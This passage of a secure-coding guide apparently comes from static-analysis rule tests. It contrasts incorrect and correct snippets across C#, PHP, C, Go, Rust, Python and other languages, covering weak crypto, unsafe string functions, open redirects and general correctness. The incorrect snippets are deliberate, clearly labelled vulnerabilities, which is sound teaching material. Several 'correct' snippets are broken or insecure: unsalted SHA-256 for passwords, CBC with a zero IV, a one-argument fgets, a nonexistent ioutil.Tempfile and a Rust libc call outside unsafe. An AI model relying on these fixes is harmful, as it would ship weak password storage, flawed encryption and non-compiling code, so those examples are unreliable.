public void CreateRC22() {
    var key = RC2.Create("ImplementationName");
}
```

**Correct: C# - AES cipher**

```csharp
using System.Security.Cryptography;

public void CreateAes1() {
    var key = Aes.Create();
}

public void CreateAes2() {
    var key = Aes.Create("ImplementationName");
}
```

**Incorrect: C# - ECB mode**

```csharp
using System.Security.Cryptography;

public void EncryptWithAesEcb() {
    Aes key = Aes.Create();
    key.Mode = CipherMode.ECB;
    using var encryptor = key.CreateEncryptor();
    byte[] msg = new byte[32];
    var cipherText = encryptor.TransformFinalBlock(msg, 0, msg.Length);
}

public void EncryptWithAesEcb2() {
    Aes key = Aes.Create();
    byte[] msg = new byte[32];
    var cipherText = key.EncryptEcb(msg, PaddingMode.PKCS7);
}
```

**Correct: C# - CBC mode**

```csharp
using System.Security.Cryptography;

public void EncryptWithAesCbc() {
    Aes key = Aes.Create();
    key.Mode = CipherMode.CBC;
    using var encryptor = key.CreateEncryptor();
    byte[] msg = new byte[32];
    var cipherText = encryptor.TransformFinalBlock(msg, 0, msg.Length);
}

public void EncryptWithAesCbc2() {
    Aes key = Aes.Create();
    byte[] msg = new byte[32];
    byte[] iv = new byte[16];
    var cipherText = key.EncryptCbc(msg, iv, PaddingMode.PKCS7);
}
```

**Incorrect: C# - weak RNG for key generation**

```csharp
using System.Security.Cryptography;

public void GenerateBadKey() {
    var rng = new System.Random();
    byte[] key = new byte[16];
    rng.NextBytes(key);
    SymmetricAlgorithm cipher = Aes.Create();
    cipher.Key = key;
}

public void GenerateBadKeyGcm() {
    var rng = new System.Random();
    byte[] key = new byte[16];
    rng.NextBytes(key);
    var cipher = new AesGcm(key);
}
```

**Correct: C# - secure RNG for key generation**

```csharp
using System.Security.Cryptography;

public void GenerateGoodKey() {
    var rng = System.Security.Cryptography.RandomNumberGenerator.Create();
    byte[] key = new byte[16];
    rng.GetBytes(key);
    var cipher = Aes.Create();
    cipher.Key = key;
}

public void GenerateGoodKeyGcm() {
    var rng = System.Security.Cryptography.RandomNumberGenerator.Create();
    byte[] key = new byte[16];
    rng.GetBytes(key);
    var cipher = new AesGcm(key);
}
```

**Incorrect: PHP - weak crypto functions**

```php
<?php

$hashed_password = crypt('mypassword');
$hashed_password = md5('mypassword');
$hashed_password = md5_file('filename.txt');
$hashed_password = sha1('mypassword');
$hashed_password = sha1_file('filename.txt');
$hashed_password = str_rot13('totally secure');
```

**Correct: PHP - secure hashing**

```php
<?php

$hashed_password = sodium_crypto_generichash('mypassword');
```

**Incorrect: PHP - MD5 for password hashing**

```php
<?php

function test1($value) {
    $pass = md5($value);
    $user->setPassword($pass);
}

function test2($value) {
    $pass = hash('md5', $value);
    $user->setPassword($pass);
}
```

**Correct: PHP - SHA256 for password hashing**

```php
<?php

function okTest1($value) {
    $pass = hash('sha256', $value);
    $user->setPassword($pass);
}
```

**Incorrect: Swift - insecure random number generators**

```swift
import Foundation

func example() -> Void {
    let randomInt = Int.random(in: 0..<6)
    let randomDouble = Double.random(in: 2.71828...3.14159)
    let randomBool = Bool.random()
    let diceRoll = Int(arc4random_uniform(6) + 1)
    let a = Int.random(in: 0 ... 10)
    var k: Int = random() % 10;
    let randomNumber = arc4random()
    arc4random_buf(&r, MemoryLayout<Self>.size)
    let x = Int.random(in: 1...100)
    var g = SystemRandomNumberGenerator()
    let y = Int.random(in: 1...100, using: &g)
}
```

**Correct: Swift - SecCopyRandomBytes**

```swift
import Security

var randomBytes = [UInt8](repeating: 0, count: 16)
let status = SecRandomCopyBytes(kSecRandomDefault, randomBytes.count, &randomBytes)
```

**Incorrect: Scala - insecure random number generator**

```scala
class Test {
  def bad1() {
    import scala.util.Random

    val result = Seq.fill(16)(Random.nextInt)
    return result.map("%02x" format _).mkString
  }
}
```

**Correct: Scala - SecureRandom**

```scala
class Test {
  def ok1() {
    import java.security.SecureRandom

    val rand = new SecureRandom()
    val value = Array.ofDim[Byte](16)
    rand.nextBytes(value)
    return value.map("%02x" format _).mkString
  }
}
```

**Incorrect: Scala - RSA without OAEP padding**

```scala
class RSACipher {
  def badRSACipher(): Void =
    try {
      val c = Cipher.getInstance("RSA/None/NoPadding")
      c.init(Cipher.ENCRYPT_MODE, k, iv)
      val cipherText = c.doFinal(plainText)
    } catch {
      case NonFatal(e) => throw new RuntimeException("Encrypt error", e)
    }
}
```

**Correct: Scala - RSA with OAEP padding**

```scala
class RSACipher {
  def okRSACipher(): Void =
    try {
      var c = Cipher.getInstance("RSA/ECB/OAEPWithMD5AndMGF1Padding")
      c.init(Cipher.ENCRYPT_MODE, k, iv)
      val cipherText = c.doFinal(plainText)
    } catch {
      case NonFatal(e) => throw new RuntimeException("Encrypt error", e)
    }
}
```

**Incorrect: Rust - insecure hash algorithms**

```rust
use md2::{Md2};
use md4::{Md4};
use md5::{Md5};
use sha1::{Sha1};

let mut hasher = Md2::new();
let mut hasher = Md4::new();
let mut hasher = Md5::new();
let mut hasher = Sha1::new();
```

**Correct: Rust - SHA256 hashing**

```rust
use sha2::{Sha256};

let mut hasher = Sha256::new();
```

### 0.3 Avoid Unsafe Functions

**Impact: HIGH**

Certain functions in various programming languages are inherently dangerous because they do not perform boundary checks, can lead to buffer overflows, have been deprecated, or bypass type safety mechanisms. Using these functions can result in security vulnerabilities, memory corruption, and arbitrary code execution.

**Incorrect: C - strcat buffer overflow**

```c
int bad_strcpy(src, dst) {
    n = DST_BUFFER_SIZE;
    if ((dst != NULL) && (src != NULL) && (strlen(dst)+strlen(src)+1 <= n))
    {
        // ruleid: insecure-use-strcat-fn
        strcat(dst, src);

        // ruleid: insecure-use-strcat-fn
        strncat(dst, src, 100);
    }
}
```

**Correct: C - use strcat_s with bounds checking**

```c
// Use strcat_s which performs bounds checking
```

**Incorrect: C - strcpy buffer overflow**

```c
int bad_strcpy(src, dst) {
    n = DST_BUFFER_SIZE;
    if ((dst != NULL) && (src != NULL) && (strlen(dst)+strlen(src)+1 <= n))
    {
        // ruleid: insecure-use-string-copy-fn
        strcpy(dst, src);

        // ruleid: insecure-use-string-copy-fn
        strncpy(dst, src, 100);
    }
}
```

**Correct: C - use strcpy_s with bounds checking**

```c
// Use strcpy_s which performs bounds checking
```

**Incorrect: C - strtok modifies buffer**

```c
int bad_code() {
    char str[DST_BUFFER_SIZE];
    fgets(str, DST_BUFFER_SIZE, stdin);
    // ruleid:insecure-use-strtok-fn
    strtok(str, " ");
    printf("%s", str);
    return 0;
}
```

**Correct: C - use strtok_r instead**

```c
int main() {
    char str[DST_BUFFER_SIZE];
    char dest[DST_BUFFER_SIZE];
    fgets(str, DST_BUFFER_SIZE, stdin);
    // ok:insecure-use-strtok-fn
    strtok_r(str, " ", *dest);
    printf("%s", str);
    return 0;
}
```

**Incorrect: C - scanf buffer overflow**

```c
int bad_code() {
    char str[DST_BUFFER_SIZE];
    // ruleid:insecure-use-scanf-fn
    scanf("%s", str);
    printf("%s", str);
    return 0;
}
```

**Correct: C - use fgets instead**

```c
int main() {
    char str[DST_BUFFER_SIZE];
    // ok:insecure-use-scanf-fn
    fgets(str);
    printf("%s", str);
    return 0;
}
```

**Incorrect: C - gets buffer overflow**

```c
int bad_code() {
    char str[DST_BUFFER_SIZE];
    // ruleid:insecure-use-gets-fn
    gets(str);
    printf("%s", str);
    return 0;
}
```

**Correct: C - use fgets or gets_s instead**

```c
int main() {
    char str[DST_BUFFER_SIZE];
    // ok:insecure-use-gets-fn
    fgets(str);
    printf("%s", str);
    return 0;
}
```

**Incorrect: PHP - deprecated mcrypt functions**

```php
<?php

// ruleid: mcrypt-use
mcrypt_ecb(MCRYPT_BLOWFISH, $key, base64_decode($input), MCRYPT_DECRYPT);

// ruleid: mcrypt-use
mcrypt_create_iv($iv_size, MCRYPT_RAND);

// ruleid: mcrypt-use
mdecrypt_generic($td, $c_t);
```

**Correct: PHP - use Sodium or OpenSSL**

```php
<?php

// ok: mcrypt-use
sodium_crypto_secretbox("Hello World!", $nonce, $key);

// ok: mcrypt-use
openssl_encrypt($plaintext, $cipher, $key, $options=0, $iv, $tag);
```

**Incorrect: Python - tempfile.mktemp race condition**

```python
import tempfile as tf

# ruleid: tempfile-insecure
x = tempfile.mktemp()
# ruleid: tempfile-insecure
x = tempfile.mktemp(dir="/tmp")
```

**Correct: Python - use NamedTemporaryFile**

```python
import tempfile

# Use NamedTemporaryFile instead
with tempfile.NamedTemporaryFile() as tmp:
    tmp.write(b"data")
```

**Incorrect: Go - unsafe package bypasses type safety**

```go
package main

import (
	"fmt"
	"unsafe"

	foobarbaz "unsafe"
)

type Fake struct{}

func (Fake) Good() {}
func main() {
	unsafeM := Fake{}
	unsafeM.Good()
	intArray := [...]int{1, 2}
	fmt.Printf("\nintArray: %v\n", intArray)
	intPtr := &intArray[0]
	fmt.Printf("\nintPtr=%p, *intPtr=%d.\n", intPtr, *intPtr)
	// ruleid: use-of-unsafe-block
	addressHolder := uintptr(foobarbaz.Pointer(intPtr)) + unsafe.Sizeof(intArray[0])
	// ruleid: use-of-unsafe-block
	intPtr = (*int)(foobarbaz.Pointer(addressHolder))
	fmt.Printf("\nintPtr=%p, *intPtr=%d.\n\n", intPtr, *intPtr)
}
```

**Correct: Go - avoid unsafe package**

```go
// Avoid using the unsafe package. Use Go's type-safe alternatives for memory operations.
```

**Incorrect: Rust - unsafe block bypasses safety**

```rust
// ruleid: unsafe-usage
let pid = unsafe { libc::getpid() as u32 };
```

**Correct: Rust - use safe alternatives**

```rust
// ok: unsafe-usage
let pid = libc::getpid() as u32;
```

**Incorrect: OCaml - unsafe functions skip bounds checks**

```ocaml
let cb = Array.make 10 2 in
(* ruleid:ocamllint-unsafe *)
Printf.printf "%d\n" (Array.unsafe_get cb 12)
```

**Correct: OCaml - use bounds-checked functions**

```ocaml
let cb = Array.make 10 2 in
(* Use bounds-checked version *)
Printf.printf "%d\n" (Array.get cb 0)
```

### 0.4 Code Best Practices

**Impact: LOW**

This document outlines coding best practices across multiple languages. Following these patterns helps improve code quality, maintainability, and prevents common mistakes.

**Incorrect: Python - file not closed**

```python
def func1():
    # ruleid:open-never-closed
    fd = open('foo')
    x = 123
```

**Correct: Python - file properly closed**

```python
def func2():
    # ok:open-never-closed
    fd = open('bar')
    fd.close()

def func3():
    # ok:open-never-closed
    fd = open('baz')
    try:
        pass
    finally:
        fd.close()
```

**Incorrect: Python - unspecified encoding**

```python
def func1():
    # ruleid:unspecified-open-encoding
    fd = open('foo')
    fd.close()

def func2():
    # ruleid:unspecified-open-encoding
    fd = open('foo', mode="w")
    fd.close()
```

`open()` uses device locale encodings by default, corrupting files with special characters. Specify the encoding to ensure cross-platform support when opening files in text mode.

**Correct: Python - encoding specified**

```python
def func7():
    # ok:unspecified-open-encoding
    fd = open('foo', encoding='utf-8')
    fd.close()

def func8():
    # ok:unspecified-open-encoding
    fd = open('foo', encoding="utf-8", mode="w")
    fd.close()
```

**References:**

- https://www.python.org/dev/peps/pep-0597/

- https://docs.python.org/3/library/functions.html#open

**Incorrect: Python - missing __hash__ with __eq__**

```python
# ruleid:missing-hash-with-eq
class A:
    def __eq__(self, someother):
        pass
```

Class that has defined `__eq__` should also define `__hash__` for proper behavior in sets and as dictionary keys.

**Correct: Python - __hash__ defined with __eq__**

```python
# ok:missing-hash-with-eq
class A2:
    def __eq__(self, someother):
        pass

    def __hash__(self):
        pass
```

**Incorrect: Python - empty pass body**

```python
# ruleid:pass-body-range
for i in range(100):
    pass

# ruleid:pass-body-fn
def foo():
    pass
```

`pass` as the body of a function or loop is often a mistake or unfinished code.

**Correct: Python - appropriate use of pass**

```python
def __init__(self):
    # ok:pass-body-fn
    pass

class foo:
    def somemethod():
        # ok:pass-body-fn
        pass
```

**Incorrect: Python - requests without timeout**

```python
import requests

url = "www.github.com"

# ruleid: use-timeout
r = requests.get(url)

# ruleid: use-timeout
r = requests.post(url)
```

`requests` calls without a timeout will hang the program if a response is never received. Always set a timeout for all requests.

**Correct: Python - requests with timeout**

```python
# ok: use-timeout
r = requests.get(url, timeout=50)

def from_import_test1(url):
    from requests import get, post

    # ok: use-timeout
    r = get(url, timeout=3)
```

**References:**

- https://docs.python-requests.org/en/latest/user/advanced/?highlight=timeout#timeouts

**Incorrect: Django - HttpResponse with json.dumps**

```python
from django.http import HttpResponse
import json

def foo():
    # ruleid:use-json-response
    dump = json.dumps({})
    return HttpResponse(dump, content_type='application/json')
```

Use Django's `JsonResponse` helper instead of manually serializing JSON.

**Incorrect: Flask - json.dumps instead of jsonify**

```python
import flask
import json
app = flask.Flask(__name__)

@app.route("/user")
def user():
    user_dict = get_user(request.args.get("id"))
    # ruleid:use-jsonify
    return json.dumps(user_dict)
```

`flask.jsonify()` is a Flask helper method which handles the correct settings for returning JSON from Flask routes.

**References:**

- https://flask.palletsprojects.com/en/2.2.x/api/#flask.json.jsonify

**Incorrect: JavaScript - lazy loading modules inside functions**

```javascript
function smth() {
  // ruleid: lazy-load-module
  const mod = require('module-name')
  return mod();
}
```

Lazy loading can complicate code bundling. `require` calls are run synchronously by Node.js and may block other requests when called from within a function.

**Correct: JavaScript - modules loaded at top level**

```javascript
// ok: lazy-load-module
const fs = require('fs')
```

**References:**

- https://nodesecroadmap.fyi/chapter-2/dynamism.html

- https://github.com/goldbergyoni/nodebestpractices#-38-require-modules-first-not-inside-functions

**Incorrect: JavaScript - debug statements in code**

```javascript
// ruleid:javascript-prompt
var name = prompt('what is your name');
// ruleid: javascript-alert
alert('your name is ' + name);
// ruleid: javascript-confirm
if ( confirm("pushem!") == true) {
    r = "x";
} else {
    r = "Y";
    // ruleid: javascript-debugger
    debugger;
}
```

Debug statements like `alert()`, `confirm()`, `prompt()`, and `debugger` should not be in production code.

**Incorrect: JavaScript - async zlib operations in loops**

```javascript
const zlib = require('zlib');

const payload = Buffer.from('This is some data');

for (let i = 0; i < 30000; ++i) {
    // ruleid: zlib-async-loop
    zlib.deflate(payload, (err, buffer) => {});
}

[1,2,3].forEach((el) => {
    // ruleid: zlib-async-loop
    zlib.deflate(payload, (err, buffer) => {});
})
```

Creating and using a large number of zlib objects simultaneously can cause significant memory fragmentation. Cache compression results or make operations synchronous to avoid duplication of effort.

**Correct: JavaScript - sync zlib or single async call**

```javascript
for (let i = 0; i < 30000; ++i) {
    // ok: zlib-async-loop
    zlib.deflateSync(payload);
}

// ok: zlib-async-loop
zlib.deflate(payload, (err, buffer) => {});
```

**References:**

- https://nodejs.org/api/zlib.html#zlib_threadpool_usage_and_performance_considerations

**Incorrect: TypeScript - using deprecated Moment.js**

```typescript
// ruleid: moment-deprecated
import moment from 'moment';
// ruleid: moment-deprecated
import { moment } from 'moment';
```

Moment.js is a legacy project in maintenance mode. Consider using actively supported libraries like `dayjs`.

**Correct: TypeScript - using dayjs**

```typescript
// ok: moment-deprecated
import dayjs from 'dayjs';
```

**References:**

- https://momentjs.com/docs/#/-project-status/

- https://day.js.org/

**Incorrect: React - spreading props directly**

```jsx
function Test1(props) {
// ruleid: react-props-spreading
    const el = <App {...props} />;
    return el;
}

function Test2(props) {
// ruleid: react-props-spreading
    const el = <MyCustomComponent {...props} some_other_prop={some_other_prop} />;
    return el;
}
```

Explicitly pass props to HTML components rather than using the spread operator. The spread operator risks passing invalid HTML props or allowing malicious attribute injection.

**Correct: React - explicit props**

```jsx
function Test2(props, otherProps) {
    const {src, alt} = props;
    const {one_prop, two_prop} = otherProps;
// ok: react-props-spreading
    return <MyCustomComponent one_prop={one_prop} two_prop={two_prop} />;
}
```

**References:**

- https://github.com/yannickcr/eslint-plugin-react/blob/master/docs/rules/jsx-props-no-spreading.md

**Incorrect: React - copying props into state**

```jsx
class Test1 extends React.Component {
  constructor() {
    // ruleid:react-props-in-state
    this.state = {
          foo: 'bar',
          color: this.props.color,
          one: 1
    };
  }
}

function Test3({ text }) {
  // ruleid:react-props-in-state
  const [buttonText] = useState(text)
  return <button>{buttonText}</button>
}
```

Copying a prop into state causes all updates to be ignored. Read props directly in your component instead.

**Correct: React - using props directly**

```jsx
class OkTest extends React.Component {
// ok: react-props-in-state
  constructor() {
    this.state = {
          foo: 'bar',
          initialColor: this.props.color,
          one: 1
    };
  }
}

function OkTest1({ color, children }) {
  const textColor = useMemo(
// ok: react-props-in-state
    () => slowlyCalculateTextColor(color),
    [color]
  );
}
```

**References:**

- https://overreacted.io/writing-resilient-components/#principle-1-dont-stop-the-data-flow

**Incorrect: Bash - iterating over ls output**

```bash
# ruleid:iteration-over-ls-output
for file in $(ls dir); do echo "Found a file: $file"; done

# ruleid:iteration-over-ls-output
for file in $(ls dir)
do
  echo "Found a file: $file"
done
```

Iterating over `ls` output is fragile. Use globs like `dir/*` instead.

**Correct: Bash - using globs**

```bash
# ok:iteration-over-ls-output
for file in dir/*; do
  echo "Found a file: $file"
done
```

**References:**

- https://github.com/koalaman/shellcheck/wiki/SC2045

**Incorrect: Bash - useless cat**

```bash
# ruleid:useless-cat
cat | a b

# ruleid:useless-cat
cat file | a b

# ruleid:useless-cat
a b | cat > file

# ruleid:useless-cat
a b | cat | c d
```

Useless calls to `cat` in a pipeline waste resources. Use `<` and `>` for reading from or writing to files.

**Correct: Bash - efficient file operations**

```bash
# ok:useless-cat
a b

# ok:useless-cat
cat file1 file2 | a b

# ok:useless-cat
cat $files | a b
```

**References:**

- https://github.com/koalaman/shellcheck/wiki/SC2002

**Incorrect: Java - bad hexadecimal conversion**

```java
// ruleid: bad-hexa-conversion
public static String badHash(String password) throws NoSuchAlgorithmException, UnsupportedEncodingException {
    MessageDigest md = MessageDigest.getInstance("SHA-1");
    byte[] resultBytes = md.digest(password.getBytes("UTF-8"));

    StringBuilder stringBuilder = new StringBuilder();
    for (byte b : resultBytes) {
        stringBuilder.append(Integer.toHexString(b & 0xFF));
    }

    return stringBuilder.toString();
}
```

`Integer.toHexString()` strips leading zeroes from each byte when read byte-by-byte. This weakens hash values by introducing more collisions. Use `String.format("%02X", ...)` instead.

**Correct: Java - proper hexadecimal conversion**

```java
// ok: bad-hexa-conversion
public static String goodHash(String password) throws NoSuchAlgorithmException, UnsupportedEncodingException {
    MessageDigest md = MessageDigest.getInstance("SHA-1");
    byte[] resultBytes = md.digest(password.getBytes("UTF-8"));

    StringBuilder stringBuilder = new StringBuilder();
    for (byte b : resultBytes) {
        stringBuilder.append(String.format("%02X", b));
    }

    return stringBuilder.toString();
}
```

**References:**

- https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION

**Incorrect: Kotlin - cookie missing HttpOnly flag**

```kotlin
public class CookieController {
    public fun setCookie(value: String, response: HttpServletResponse) {
        val cookie: Cookie = Cookie("cookie", value)
        // ruleid: cookie-missing-httponly
        response.addCookie(cookie)
    }

    public fun explicitDisable(value: String, response: HttpServletResponse) {
        val cookie: Cookie = Cookie("cookie", value)
        cookie.setSecure(false)
        // ruleid:cookie-missing-httponly
        cookie.setHttpOnly(false)
        response.addCookie(cookie)
    }
}
```

The `HttpOnly` flag instructs the browser to forbid client-side scripts from reading the cookie. Always set this flag for security-sensitive cookies.

**Correct: Kotlin - cookie with HttpOnly flag**

```kotlin
public fun setSecureHttponlyCookie(value: String, response: HttpServletResponse ) {
    val cookie: Cookie = Cookie("cookie", value)
    cookie.setSecure(true)
    cookie.setHttpOnly(true)
    // ok: cookie-missing-httponly
    response.addCookie(cookie)
}
```

**References:**

- https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE

**Incorrect: C - using memset for sensitive data**

```c
void badcode(char *password, size_t bufferSize) {
  char token[256];
  init(token, password);
  // ruleid: insecure-use-memset
  memset(password, ' ', strlen(password));
  // ruleid: insecure-use-memset
  memset(token, ' ', strlen(localBuffer));
  free(password);
}
```

When handling sensitive information in a buffer, `memset()` can leave sensitive information behind due to compiler optimizations. Use `memset_s()` which securely overwrites memory.

**Correct: C - using memset_s for sensitive data**

```c
void okcode(char *password, size_t bufferSize) {
  char token[256];
  init(token, password);
  // ok: insecure-use-memset
  memset_s(password, bufferSize, ' ', strlen(password));
  // ok: insecure-use-memset
  memset_s(token, sizeof(token), ' ', strlen(localBuffer));
  free(password);
}
```

**References:**

- https://cwe.mitre.org/data/definitions/14.html

- https://owasp.org/Top10/A02_2021-Cryptographic_Failures/

**Incorrect: Go - bad tmp file creation**

```go
func main() {
	// ruleid:bad-tmp-file-creation
	err := ioutil.WriteFile("/tmp/demo2", []byte("This is some data"), 0644)
	if err != nil {
		fmt.Println("Error while writing!")
	}
}
```

File creation in shared tmp directory without using `ioutil.Tempfile` can lead to insecure temporary file vulnerabilities.

**Correct: Go - using ioutil.Tempfile**

```go
func main_good() {
	// ok:bad-tmp-file-creation
	err := ioutil.Tempfile("/tmp", "my_temp")
	if err != nil {
		fmt.Println("Error while writing!")
	}
}
```

**References:**

- https://owasp.org/Top10/A01_2021-Broken_Access_Control

**Incorrect: Rust - using temp_dir for security operations**

```rust
use std::env;

// ruleid: temp-dir
let dir = env::temp_dir();
```

`temp_dir()` should not be used for security operations as the temporary directory may be shared among users or processes with different privileges.

**References:**

- https://doc.rust-lang.org/stable/std/env/fn.temp_dir.html

**Incorrect: Elixir - deprecated use Bitwise**

```elixir
# ruleid: deprecated_use_bitwise
use Bitwise
```

The syntax `use Bitwise` is deprecated. Use `import Bitwise` instead.

**Correct: Elixir - import Bitwise**

```elixir
import Bitwise
```

**References:**

- https://github.com/elixir-lang/elixir/commit/f1b9d3e818e5bebd44540f87be85979f24b9abfc

**Incorrect: Elixir - inefficient Enum.map then Enum.join**

```elixir
# ruleid: enum_map_join
Enum.join(Enum.map(["a", "b", "c"], fn s -> String.upcase(s) end), ", ")

# ruleid: enum_map_join
Enum.map(["a", "b", "c"], fn s -> String.upcase(s) end)
|> Enum.join(", ")

# ruleid: enum_map_join
["a", "b", "c"]
|> Enum.map(fn s -> String.upcase(s) end)
|> Enum.join(", ")
```

Using `Enum.map_join/3` is more efficient than `Enum.map/2 |> Enum.join/2`.

**References:**

- https://github.com/rrrene/credo/blob/master/lib/credo/check/refactor/map_join.ex

**Incorrect: OCaml - explicit boolean comparisons**

```ocaml
let test a =
  (* ruleid:ocamllint-bool-true *)
  let x = a = true in
  (* ruleid:ocamllint-bool-true *)
  let x = a == true in
  (* ruleid:ocamllint-bool-false *)
  let x = a = false in
  (* ruleid:ocamllint-bool-false *)
  let x = a == false in
  ()
```

Comparing to `true` or `false` explicitly is unnecessary and reduces readability.

**Correct: OCaml - implicit boolean evaluation**

Use `$X` directly instead of `$X = true`, and `not $X` instead of `$X = false`.

**Incorrect: OCaml - List.find outside try block**

```ocaml
let test1 xs =
  (* ruleid:list-find-outside-try *)
  if List.find 1 xs
  then 1
  else 2
```

`List.find` should be used inside a try block, or use `List.find_opt` instead.

**Correct: OCaml - List.find inside try block**

```ocaml
let test2 xs =
 (* ok *)
 try
   if List.find 1 xs
   then 1
   else 2
 with Not_found -> 3
```

**Incorrect: Ruby - unscoped find with user input**

```ruby
class GroupsController < ApplicationController

  def show
    #ruleid: check-unscoped-find
    @user = User.find(params[:id])
  end

  def get
    #ruleid: check-unscoped-find
    @some_record = SomeRecord.find_by_id!(params[:id])
  end
end
```

Unscoped `find(...)` with user-controllable input may lead to Insecure Direct Object Reference (IDOR) behavior.

**Correct: Ruby - scoped find operations**

```ruby
def show_ok
  #ok: check-unscoped-find
  @user = User.find(session[:id])
end

def show_ok2
  #ok: check-unscoped-find
  current_user = User.find(session[:id])
  #ok: check-unscoped-find
  current_user.accounts.find(param[:id])
end
```

**References:**

- https://brakemanscanner.org/docs/warning_types/unscoped_find/

**Incorrect: PHP - phpinfo in production**

```php
<?php

// ruleid: phpinfo-use
echo phpinfo();
```

The `phpinfo` function may reveal sensitive information about your environment.

**References:**

- https://www.php.net/manual/en/function.phpinfo

**Incorrect: Swift - sensitive data in UserDefaults**

```swift
let passphrase = getPass()

// ruleid: swift-user-defaults
UserDefaults.standard.set(passphrase, forKey: "passphrase")
// ruleid: swift-user-defaults
UserDefaults.standard.set(passWord, forKey: "userPassword")

// ruleid: swift-user-defaults
UserDefaults.standard.set("12717-127163-a71367-127ahc", forKey: "apiKey")

let apiKey = "12717-127163-a71367-127ahc"
// ruleid: swift-user-defaults
UserDefaults.standard.set(apiKey, forKey: "GOOGLE_TOKEN")
```

Sensitive data stored in UserDefaults is not adequately protected. Use the Keychain for data of a sensitive nature.

**Correct: Swift - non-sensitive data in UserDefaults**

```swift
let username = getUsername()

// okid: swift-user-defaults
UserDefaults.standard.set(username, forKey: "userName")
```

**References:**

- https://developer.apple.com/library/archive/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html

- https://mas.owasp.org/MASVS/controls/MASVS-STORAGE-1/

**Incorrect: Terraform - S3 bucket with public read access**

```hcl
resource "aws_s3_bucket" "a" {
  bucket = "my-tf-test-bucket"
  # ruleid: s3-public-read-bucket
  acl    = "public-read"

  tags = {
    Name        = "My bucket"
    Environment = "Dev"
  }
}

resource "aws_s3_bucket" "b" {
  bucket = "my-tf-test-bucket-b"
  # ruleid: s3-public-read-bucket
  acl    = "authenticated-read"
}
```

S3 buckets with public read access expose data to unauthorized users.

**Correct: Terraform - S3 bucket with policy**

```hcl
resource "aws_s3_bucket" "c" {
  bucket = "s3-website-test.hashicorp.com"
  # ok: s3-public-read-bucket
  acl    = "public-read"
  policy = file("policy.json")

  website {
    index_document = "index.html"
    error_document = "error.html"
  }
}
```

**References:**

- https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#acl

- https://docs.aws.amazon.com/AmazonS3/latest/dev/acl-overview.html#canned-acl

**Incorrect: C# - open redirect vulnerability**

```csharp
[HttpPost]
public ActionResult LogOn(LogOnModel model, string returnUrl)
{
    if (ModelState.IsValid)
    {
        if (MembershipService.ValidateUser(model.UserName, model.Password))
        {
            FormsService.SignIn(model.UserName, model.RememberMe);
            if (!String.IsNullOrEmpty(returnUrl))
            {
                // ruleid: open-redirect
                return Redirect(returnUrl);
            }
        }
    }
}
```

A query string parameter may contain a URL value that could cause the web application to redirect to a malicious website. Always validate redirect URLs.

**Correct: C# - validated redirect URL**

```csharp
[HttpPost]
public ActionResult LogOn(LogOnModel model, string returnUrl)
{
    if (ModelState.IsValid)
    {
        if (MembershipService.ValidateUser(model.UserName, model.Password))
        {
            FormsService.SignIn(model.UserName, model.RememberMe);
            if (IsLocalUrl(returnUrl))
            {
                // ok: open-redirect
                return Redirect(returnUrl);
            }
            else
            {
                return RedirectToAction("Index", "Home");
            }
        }
    }
}
```

**References:**

- https://cwe.mitre.org/data/definitions/601.html

### 0.5 Code Correctness

**Impact: MEDIUM**

- [Python](#python)

- [JavaScript/TypeScript](#javascripttypescript)

- [Go](#go)

- [Java](#java)

- [C](#c)

- [C#](#c-1)

- [Ruby](#ruby)

- [Scala](#scala)

- [Elixir](#elixir)

- [Bash](#bash)

- [OCaml](#ocaml)

---

Python only instantiates default function arguments once and shares the instance across function calls. Mutating a default mutable argument modifies the instance used by all future calls.

**INCORRECT** - Mutating default list:**

```python
def append_func1(default=[]):
    # ruleid: default-mutable-list
    default.append(5)
```

**INCORRECT** - Mutating default dict:**

```python
def assign_func1(default={}):
    # ruleid: default-mutable-dict
    default["potato"] = 5
```

**CORRECT** - Copy before mutating:**

```python
def not_append_func2(default=[]):
    # list() returns a copy
    default = list(default)
    default.append(5)

def not_assign_func2(default={}):
    # dict() returns a copy
    default = dict(default)
    default[123] = 456
```

Modifying a list or dictionary while iterating over it leads to runtime errors or infinite loops.

**INCORRECT** - Modifying list while iterating:**

```python
a = [1, 2, 3, 4]
# ruleid:list-modify-while-iterate
for i in a:
    print(i)
    a.pop(0)

b = [1, 2, 3, 4]
# ruleid:list-modify-while-iterate
for i in b:
    print(i)
    b.append(0)
```

**INCORRECT** - Deleting from dict while iterating:**

```python
d = {'a': 1, 'b': 2}
# ruleid:dict-del-while-iterate
for k,v in d.items():
    del d[k]
```

**CORRECT** - Iterate over a copy or different collection:**

```python
d = []
e = [1, 2, 3, 4]
# ok:list-modify-while-iterate
for i in e:
    print(i)
    d.append(i)
```

Returning a value (other than None) or yielding inside `__init__` causes a runtime error.

**INCORRECT**:**

```python
class A:
    def __init__(a, b, c):
        # ruleid:return-in-init
        return A(a, b, c)

class C:
    def __init__(a, b, c):
        # ruleid:yield-in-init
        yield
```

**CORRECT**:**

```python
class B:
    def __init__(a, b, c):
        # ok:return-in-init
        return  # Returning None is OK

class H:
    def __init__(self, x):
        # ok:return-in-init
        return None
```

Using `break`, `continue`, or `return` in a `finally` block suppresses exceptions.

**INCORRECT**:**

```python
try:
  for i in range(3):
    # ruleid: suppressed-exception-handling-finally-break
    try:
      1 / 0
    except ZeroDivisionError:
      raise ZeroDivisionError("Error: you're trying to divide by zero!")
    finally:
      print("finally executed")
      break  # This suppresses the exception!
except ZeroDivisionError:
  print("outer ZeroDivisionError caught")
```

**CORRECT**:**

```python
try:
  for i in range(3):
    # ok: suppressed-exception-handling-finally-break
    try:
      1 / 0
    except ZeroDivisionError:
      raise ZeroDivisionError("Error: you're trying to divide by zero!")
    finally:
      print("finally executed")
except ZeroDivisionError:
  print("outer ZeroDivisionError caught")
```

In Python 3, you can only raise objects that inherit from `BaseException`.

**INCORRECT**:**

```python
# ruleid:raise-not-base-exception
raise "error here"

# ruleid:raise-not-base-exception
raise 5
```

**CORRECT**:**

```python
# ok:raise-not-base-exception
raise Exception()
```

**INCORRECT**:**

```python
fout = open("example.txt", 'r')
print("stuff")
# ruleid:writing-to-file-in-read-mode
fout.write("whoops, I'm not writable!")
fout.close()
```

**CORRECT**:**

```python
fout = open("example.txt", 'w')
print("stuff")
# ok:writing-to-file-in-read-mode
fout.write("I'm writable!")
fout.close()
```

**INCORRECT**:**

```python
def test1():
    # ruleid:file-object-redefined-before-close
    fin = open("file1.txt", 'r')
    data = fin.read()
